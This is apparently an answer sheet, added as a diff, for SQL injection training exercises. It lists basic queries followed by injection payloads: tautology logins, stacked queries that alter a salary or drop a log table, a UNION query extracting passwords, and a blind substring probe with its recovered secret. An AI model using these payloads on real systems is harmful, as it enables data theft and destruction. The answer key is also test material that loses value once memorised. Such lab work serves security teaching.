@@ -1,0 +1,36 @@
+3) SELECT department 
+FROM Employees 
+WHERE first_name='Bob' AND last_name='Franco'
+
+3)UPDATE Employees 
+SET department='Sales' 
+WHERE first_name='Tobi' AND last_name='Barnett'
+
+4) ALTER TABLE Employees 
+ADD phone varchar(20)
+
+5) GRANT ALTER TABLE TO UnauthorizedUser
+
+9)SELECT * 
+FROM user_data 
+WHERE first_name = 'John' AND last_name = '' OR '1'='1'
+
+10)
+LoginCount: 6
+userid: 0 or 1=1
+
+11) Employee Name: ' or 1 = 1 -- -
+Authentication TAN = kvjnfkds
+
+12) Employee Name: '; UPDATE Employees SET SALARY = 100000 WHERE userid=37648 --
+
+13) '; DROP TABLE access_log --
+
+ADVANCED
+
+3)
+a';SELECT * FROM user_system_data;--
+a';SELECT cc_type FROM user_data UNION SELECT password FROM user_system_data WHERE user_name = 'dave';--
+
+5)
+tom' AND substring(password,1,x) (<,>,=) "textoejemplo // solution --> "thisisasecretfortomonly" 
